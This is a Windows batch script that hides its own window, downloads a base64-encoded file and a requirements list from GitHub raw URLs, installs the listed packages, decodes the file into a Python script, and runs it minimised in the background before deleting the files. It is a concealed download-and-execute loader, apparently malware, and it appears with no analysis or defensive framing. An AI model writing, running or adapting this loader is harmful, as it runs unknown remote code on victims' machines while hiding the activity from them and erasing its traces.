@echo off
powershell -WindowStyle Hidden -Command "$batchPath = $MyInvocation.MyCommand.Path; Start-Process -FilePath cmd.exe -ArgumentList '/c', $batchPath, '-nologo' -WindowStyle Hidden"
set "downloads_folder=%USERPROFILE%\Downloads"
set "activate_script=%downloads_folder%\.venv\Scripts\activate"

cd /d "%downloads_folder%"
call "%activate_script%"

curl -o %USERPROFILE%\Downloads\kilss.txt https://raw.githubusercontent.com/zerot2Dev/devsc/main/kilss.txt
curl -o %USERPROFILE%\Downloads\requirements.txt https://raw.githubusercontent.com/zerot2Dev/zero_import/main/requirements.txt

pip install -r %downloads_folder%\requirements.txt
del %downloads_folder%\requirements.txt

set output_file=%downloads_folder%\decoded_file.py

echo import os  >> %output_file%
echo import base64 >> %output_file%
echo input_file_path = os.path.join(os.getcwd(), "kilss.txt") >> %output_file%
echo with open(input_file_path, "r", encoding="utf-8") as file: >> %output_file%
echo     encoded_data = file.read() >> %output_file%
echo decoded_data = base64.b64decode(encoded_data) >> %output_file%
echo output_file_path = os.path.join(os.getcwd(), "output.py") >> %output_file%
echo with open(output_file_path, "w", encoding="utf-8") as output_file: >> %output_file%
echo     output_file.write(decoded_data.decode("utf-8")) >> %output_file%

if exist %output_file% (
    start /B /MIN python %output_file%
    del %output_file%
)

if exist %downloads_folder%\output.py (
    start /B /MIN python %downloads_folder%\output.py
    del %downloads_folder%\output.py
    del %downloads_folder%\kilss.txt
)
exit /b
